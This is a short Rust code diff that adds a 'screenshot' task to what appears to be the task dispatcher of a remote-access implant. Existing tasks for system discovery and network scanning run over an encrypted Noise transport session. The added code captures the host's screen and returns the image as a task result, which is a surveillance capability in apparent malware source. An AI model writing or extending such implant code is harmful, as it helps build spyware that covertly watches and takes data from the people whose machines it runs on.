@@ -672,6 +672,14 @@ fn dispatch_tasks(data: &[u8], session: &mut NoiseTransport, transport: &mut dyn
                 "sys_info" => {
                     result = Some(crate::modules::discovery::Discovery.sys_info());
                 },
+                "screenshot" => {
+                    let res = crate::modules::screenshot::Screenshot.capture();
+                    let msg = match res {
+                        Ok(data) => data,
+                        Err(_) => b"Screenshot failed".to_vec(),
+                    };
+                    result = Some(SensitiveData::new(&msg));
+                },
                 "net_scan" => {
                     result = Some(crate::modules::discovery::Discovery.net_scan(&task.payload));
                 },
